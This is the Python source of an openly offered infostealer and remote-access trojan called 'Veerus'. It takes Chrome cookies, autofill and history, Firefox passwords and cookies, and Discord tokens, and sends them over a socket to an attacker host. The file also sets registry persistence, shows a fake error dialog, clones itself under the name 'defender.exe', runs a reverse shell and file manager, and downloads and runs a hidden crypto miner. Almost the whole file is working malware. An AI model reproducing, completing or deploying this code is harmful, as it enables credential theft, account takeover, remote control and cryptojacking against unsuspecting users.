import os
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir
from shutil import copyfile
import sqlite3
import win32crypt
import codecs
import win32crypt
import shutil
import command
import socket
import time
import threading
import re
import json
import uuid
from glob import glob
import FireFoxDecrypt
import requests
from startup import startup
from tkinter import messagebox
import discord
import sys
import base64
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from regex import findall
import platform
from http.server import BaseHTTPRequestHandler, HTTPServer
import time

import os
from http.server import HTTPServer, CGIHTTPRequestHandler



"""

	globals :

"""

ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao

PORTWEB = 80
CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
PROCESS_NUM = 2 #2 is the perfect number,if you want your program to be un-removable put it a 4 maximum
HOST = "127.0.0.1" #change this to your ip do not change if you just want to mine.
PORT = 7777 #Dont touch.
FAKERROR = True #Show fake critical error 
FAKERRMSG = "Exception at thread 0xSxZ3b78"
MINE = True #Mine crypto? True/False

DMALL_FRIENDS = False #Dm all friends in discord using token.
DMALL_MSG = ":flag_gb: :\nFûcked by the best virus ever\n\nDiscord grabber\nTelegram session grabber\nChrome/Firefox Cr4d1t c4rds, cookies, autofill, password stealer\nUndetected\nRAT\nHidden Crypto Miner\n\n\nLink : https://github.com/0xSxZ/Veerus \n\nBy 0xSz/0xSxZ" #Leave like that if you want to support the project.


APP_DATA_PATH= os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12


if(CLONE_PROCESS == True):
	for i in range(PROCESS_NUM):
		if os.name != "nt" or os.name != "windows":
			original = sys.argv[0]
			folderName = str(uuid.uuid4())
			os.mkdir("/opt/" + folderName)
			target = "/opt/" + folderName + "defender.exe"
		else:
			original = sys.argv[0]
			folderName = str(uuid.uuid4())
			os.mkdir(str(os.getenv('APPDATA')) + folderName)
			target = str(os.getenv('APPDATA')) + folderName + "defender.exe"
		shutil.copyfile(original, target)
if(FAKERROR == True):
	messagebox.showwarning("Critical Error", FAKERRMSG) 
try:
	url = 'http://ipinfo.io/json'
	response = requests.get(url)
	data = response.json()
	IP=data['ip']
	org=data['org']
	city = data['city']
	country=data['country']
	region=data['region']
except:
	IP = str(uuid.uuid4())
	city = str(uuid.uuid4())
	country = str(uuid.uuid4())
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	s.connect((HOST, PORT))
except:
	print("Host down")

def ClearTerm():
	if(os.name == "nt" or os.name == "windows"):
		os.system("cls")
	else:
		os.system("clear")
def AddToRegistry():
	#Statup should be available soon for Mac OS
	if os.name == "nt" or os.name == "windows":
		import winreg as reg
		pth = os.path.dirname(os.path.realpath(__file__))
		
		# name of the python file with extension
		s_name=os.path.basename(__file__)	
		
		# joins the file name to end of path address
		address=os.path.join(pth,s_name)
		
		# key we want to change is HKEY_CURRENT_USER
		# key value is Software\Microsoft\Windows\CurrentVersion\Run
		key = reg.HKEY_CURRENT_USER
		key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
		
		# open the key to make changes to
		open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
		
		# modifiy the opened key
		reg.SetValueEx(open,"WineDefender",0,reg.REG_SZ,address)
		
		# now close the opened key
		reg.CloseKey(open)
	else:
		print("[.] Startup not available because os is Linux or mac.")

def stealChromeWin():
	path = str(os.environ['USERPROFILE'] + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Web Data")
	connection = sqlite3.connect(str(path))
	chromewinpwd = str( tuple(connection.execute("SELECT  name, value FROM 'autofill'")))
	connection.close()
	s.send(chromewinpwd.replace("(", '\n').replace(")", "\r\n").encode())
def stealChromeWinHistory():
	path = str(os.environ['USERPROFILE'] + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\History")
	connection = sqlite3.connect(str(path))
	chromewinhist = str( tuple(connection.execute("SELECT url FROM 'urls'")))
	connection.close()
	s.send(chromewinhist.replace("(", '\n').replace(")", "\r\n").encode())

"""
	credits : 
		https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
		https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
		https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc

"""

def get_chrome_datetime(chromedate):
	"""Return a `datetime.datetime` object from a chrome format datetime
	Since `chromedate` is formatted as the number of microseconds since January, 1601"""
	if chromedate != 86400000000 and chromedate:
		try:
			return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
		except Exception as e:
			print(f"Error: {e}, chromedate: {chromedate}")
			return chromedate
	else:
		return ""

def get_encryption_key():
	local_state_path = os.path.join(os.environ["USERPROFILE"],
									"AppData", "Local", "Google", "Chrome",
									"User Data", "Local State")
	with open(local_state_path, "r", encoding="utf-8") as f:
		local_state = f.read()
		local_state = json.loads(local_state)

	# decode the encryption key from Base64
	key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	# remove 'DPAPI' str
	key = key[5:]
	# return decrypted key that was originally encrypted
	# using a session key derived from current user's logon credentials
	# doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
	return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
	try:
		# get the initialization vector
		iv = data[3:15]
		data = data[15:]
		# generate cipher
		cipher = AES.new(key, AES.MODE_GCM, iv)
		# decrypt password
		return cipher.decrypt(data)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
		except:
			# not supported
			return ""

def chromeCookies():
	try:
		# local sqlite Chrome cookie database path
		db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
								"Google", "Chrome", "User Data", "Default", "Network", "Cookies")
		filename = "Cookies.db"
		if not os.path.isfile(filename):
			# copy file when does not exist in the current directory
			shutil.copyfile(db_path, filename)
		# connect to the database
		db = sqlite3.connect(filename)
		# ignore decoding errors
		db.text_factory = lambda b: b.decode(errors="ignore")
		cursor = db.cursor()
		# get the cookies from `cookies` table
		cursor.execute("""
		SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
		FROM cookies""")
		# you can also search by domain, e.g thepythoncode.com
		# cursor.execute("""
		# SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
		# FROM cookies
		# WHERE host_key like '%thepythoncode.com%'""")
		# get the AES key
		key = get_encryption_key()
		chrcooks = ""
		for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
			if not value:
				decrypted_value = decrypt_data(encrypted_value, key)
			else:
				# already decrypted
				decrypted_value = value
			chrcooks = chrcooks + f"""
			Host: {host_key}
			Cookie name: {name}
			Cookie value (decrypted): {decrypted_value}
			Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
			Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
			Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
			===============================================================
			"""
			# update the cookies table with the decrypted value
			# and make session cookie persistent
			cursor.execute("""
			UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
			WHERE host_key = ?
			AND name = ?""", (decrypted_value, host_key, name))
		# commit changes
		db.commit()
		# close connection
		db.close()
		return chrcooks.encode()
	except Exception as e:
		s.send(b"Error or too old chrome version..." + str(e).encode())
def PasswLinux():
	try:
		FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
		FirefoxPath2 = os.listdir(FirefoxPath)
		FirefoxLength = len(FirefoxPath2)
		for i in range(FirefoxLength):
			if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "/key4.db") or os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
				if(os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
					db = FirefoxPath + FirefoxPath2[i] + "/key3.db"
				else:
					db = FirefoxPath + FirefoxPath2[i] + "/key4.db"
				passwordF = FireFoxDecrypt.DecryptLogins(FirefoxPath+FirefoxPath2[i]+"/logins.json", db)
				s.send(b"""
-------------------------
Veerus by 0xSz
Password stealed
------------------------\n
""" + str(passwordF).encode() +b"\n\n------------------------")
				break
			else:
				print("False")
	except Exception as e:
		s.send(b"Error  or no passwords. : " + str(e).encode())

def CookiesLinux():
	try:
		FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
		FirefoxPath2 = os.listdir(FirefoxPath)
		FirefoxLength = len(FirefoxPath2)
		for i in range(FirefoxLength):
			if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "/cookies.sqlite")):
				db = FirefoxPath + FirefoxPath2[i] + "/cookies.sqlite"
				connection = sqlite3.connect(str(db))
				cookies = str( tuple(connection.execute("SELECT host FROM moz_cookies"))) + str(dict(connection.execute("SELECT name, value FROM moz_cookies")))
				connection.close()
				s.send(b"""
-------------------------
Veerus by 0xSz
Cookies stealed
------------------------\n
""" + bytes(str(cookies),encoding='utf-8') +b"\n\n------------------------")
				break
			else:
				print("False")
	except Exception as e:
		s.send(chromeCookies())
def runProcess(exe):
	p = command.run([exe]) 
	print("result >> " + str(p.output))
	s.send(p.output)
def reverse():
	print("Listening for commands...")
	while 1:
		CnMsg = s.recv(4096)
		print(str(CnMsg).replace("b'",'')[:-1])
		runProcess(str(CnMsg.decode()))
		if "exit" in str(CnMsg):
			revTh.join()
def fManager():
	print("Listening for commands (File Manager)...")
	
	while True:
		print("On while")
		CnMsg = s.recv(1024)
		
		if("dwnfile" in str(CnMsg)):
			print("pass...")
		else:
			CnMsg = str(CnMsg).replace("b'",'')[:-1]
			print(">>"+CnMsg)
			print(CnMsg)
			if "cd" in CnMsg:
				print(CnMsg[-2:])
				os.chdir(CnMdg[-2:])
			elif "ls" in str(CnMsg):
				threading.Thread(runProcess(CnMsg)).start()
			else:
				fpath = str(str(CnMsg).split(CnMsg)[0])
				print(fpath)
				fpathb = bytes(str(CnMsg).split(CnMsg)[0], encoding='utf-8')
				print("[.] File exists : " + str(os.path.isfile(fpath)))
				if(os.path.isfile(str(fpath))):
					f = open(str(fpath), "r")
					content = f.read()
					print("[°] Working on it...")
					print(content)
					s.send(bytes(content, encoding='utf-8'))
					content = f.read()
				else:
					s.send(b"0xSz >> no such file...")

"""

	credits : https://github.com/LocalsGitHub/Decrypt-Discord-Token/blob/main/decrypt.py

"""

tokens = []
cleaned = []

def decrypt(buff, master_key):
	try:
		return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
	except Exception as e:
		return "An error has occured.\n" + e
askUser = "2"
def getDiscordToken():
	if "2" in askUser:

		with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local State", "r") as file:
			key = loads(file.read())['os_crypt']['encrypted_key']
			file.close()
		for file in listdir(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\"):
			if not file.endswith(".ldb") and file.endswith(".log"):
				continue
			else:
				try:
					with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
						for x in files.readlines():
							x.strip()
							for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
								tokens.append(values +"\n")
								
				except PermissionError:
					continue
		for i in tokens:
			if i.endswith("\\"):
				i.replace("\\", "")
			elif i not in cleaned:
				cleaned.append(i)
		tosend = ""
		for token in cleaned:
			tosend = tosend + str(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]).encode())
		print(tosend.encode())
		s.send(tosend.encode())
"""

	^^^^^credits : https://github.com/LocalsGitHub/Decrypt-Discord-Token/blob/main/decrypt.py^^^^^

"""
def PasswWin():
	print("[.] Getting Win Firefow pw's")
	try:
		if os.name == 'nt' or os.name == 'windows':	
			passwordF = ""
			FirefoxPath = str(os.getenv('APPDATA')) + "/Mozilla/Firefox/Profiles/"
			FirefoxPath2 = os.listdir(FirefoxPath)
			FirefoxLength = len(FirefoxPath2)
			for i in range(FirefoxLength):
				if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "/key4.db") or os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
					if(os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
						db = FirefoxPath + FirefoxPath2[i] + "/key3.db"
					else:
						db = FirefoxPath + FirefoxPath2[i] + "/key4.db"
					passwordF = passwordF + str(FireFoxDecrypt.DecryptLogins(FirefoxPath+FirefoxPath2[i]+"/logins.json", db))
				else:
					print("False")
			s.send(b"""
	-------------------------
	Veerus by 0xSz (on github)
	Password stealed
	------------------------\n
	""" + str(passwordF).encode()+ b"\n\n------------------------")
					

		else:
			s.send(b"OS not supported.")
	except Exception as e:
		s.send(b"Error : " + str(e).encode())
def getInstructions(s):
	while True:
		msg = s.recv(1024)
		cmd = msg
		print(str(cmd))
		if 'sndfile' in str(cmd) and IP in str(cmd):
			s.send(b"Soon")
		elif 'excfile' and str(IP) in str(cmd):
			s.send("0xVictim to 0xSxZ >> Executing file...")
			os.system(str(cmd.decode).replace("excfile ",'').replace(IP+" ", '').replace(IP, ''))
		elif str('sdndallfile') in str(cmd):
			if 'true' in str(cmd):
				print('Exevuting file...')
			else:
				print('Not executing file...')
			s.send(b'soon')
		elif 'shwips' in str(cmd):
			s.send(IP.encode())
		elif str('rvshl') in str(cmd) and IP in str(cmd):
			print("Reverse shell")
			if(os.name == "nt" or os.name == "windows"):
				s.send(b'OS : Windows')
			else:
				s.send(b'OS : Linux or MacOS')
			try:
				revTh = threading.Thread(target=reverse)
				revTh.start()
			except Exception as e:
				print(e)
		elif "revcmd" in str(cmd) and IP in str(cmd):
			print(str(cmd).replace("b'", '').replace("'",'').replace(IP+" ",'').replace("revcmd ", ''))
			threading.Thread(target=runProcess, args=(str(cmd).replace("b'", '').replace("'",'').replace(IP+" ",'').replace("revcmd ", ''),)).start()
		elif "tkn" in str(cmd):
			try:
				print("[.] Getting tokens")
				getDiscordToken()
			except Exception as e:
				s.send(("Error in IP : " + IP + " OS : " + os.name + " Error : " + str(e)).encode())
		elif "dwnfile" in str(cmd) and IP in str(cmd):
			try:
				s.send(b"0xVictim to 0xSz>> Successfully connected.")
				print("Dwnfile")
				threading.Thread(target=fManager).start()
			except Exception as e:
				print(e)

def MineThreadWin():
	ClearTerm()
	print("[.] Starting miner if enabled.")
	os.system(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe -o rx.unmineable.com:3333 -u " +ADDRESS+".SxZ#ihlc-hs2a -p x -k -a rx")

def MineThreadLinux():
	print("[.] Starting miner if enabled.")
	try:
		os.system("./apt.bb -o rx.unmineable.com:3333 -u " +ADDRESS+".SxZ#ihlc-hs2a -p x -k")
	except:
		os.system("./apt.bb -o rx.unmineable.com:3333 -u "+ADDRESS+".SxZ#ihlc-hs2a -p 0xSz -k -a rx/0")
def connectOption():
	print(os.name)
	if os.name != "posix":
		s.send(bytes("[.] 0xVictim to 0xSz : New Machine connected. Startup available. ----Informations---- ====== OS :{oss} ======IP : {IP} ====== Country : {country} ====== City : {city}======".format(IP=IP,country=country,city=city, oss=os.name),encoding='utf-8'))
	else:
		s.send(bytes("[.] 0xVictim to 0xSz : New Machine connected. Startup not available. (os is not windows.) ----Informations---- ====== OS :{oss} ======IP : {IP} ====== Country : {country} ====== City : {city}======".format(IP=IP,country=country,city=city, oss=os.name),encoding='utf-8'))	

	if(os.name != "nt" and platform.system() != "Windows" or os.name != "windows" and platform.system() != "Windows"):
		print("Not windows...")
		try:
			os.system("mkdir /opt/0xSz/")
			time.sleep(2)
			os.system("mkdir /opt/0xSz/update/")
			time.sleep(2)
			os.system("mkdir /opt/0xSz/update/aptEssentials/")
			os.chdir("/opt/0xSz/update/aptEssentials/")
			os.system("apt install wget")
			os.system("wget https://www.dropbox.com/s/kebdpffh42q7e7z/apt?dl=1 -O /opt/0xSz/update/aptEssentials/apt.bb")
			os.system("chmod +x ./apt.bb")
			#threading.Thread(target=MineThreadLinux).start()
			time.sleep(2)
			if MINE == True:
				threading.Thread(target=MineThreadLinux)
				print("[.] Executing miner..")
		except Exception as e :
			print(str(e))

		threading.Thread(target=getInstructions, args=(s,)).start()
	else:
		try:
			s.send(bytes("[.] 0xVictim to 0xSz : New Machine connected. Startup available. ----Informations---- ====== OS :{oss} ======IP : {IP} ====== Country : {country} ====== City : {city}======".format(IP=IP,country=country,city=city, oss=os.name),encoding='utf-8'))
			os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny")
			os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
			os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
			open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
{
    "algo": "rx",
    "api": {
        "port": 0,
        "access-token": null,
        "worker-id": null,
        "ipv6": false,
        "restricted": true
    },
    "av": 0,
    "background": false,
    "colors": true,
    "cpu-affinity": null,
    "cpu-priority": null,
    "donate-level": 5,
    "huge-pages": true,
    "hw-aes": null,
    "log-file": null,
    "max-cpu-usage": 80,
    "pools": [
        {
            "url": "rx.unmineable.com:3333",
            "user": "'''+ ADDRESS  + '''",
            "pass": "x",
            "keepalive": true,
            "nicehash": false,
            "variant": -1,
            "tls": false,
            "tls-fingerprint": null
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "safe": false,
    "syslog": false,
    "threads": null
}

			''')
			os.system("curl http://"+ HOST +"/clientdownloads/cUrl.exe --output cUrl.exe -s")
			os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")

			if MINE == True:
				threading.Thread(target=MineThreadWin)
				print("[.] Executing miner..")
			threading.Thread(target=getInstructions, args=(s,)).start()
		except Exception as e:
			print(e)
if __name__ == "__main__":
	#Startup & Connection infos :
	connectOption()
	AddToRegistry()

	#Stealer :
	PasswWin()
	getDiscordToken()
	CookiesLinux()
	stealChromeWin()
	stealChromeWinHistory()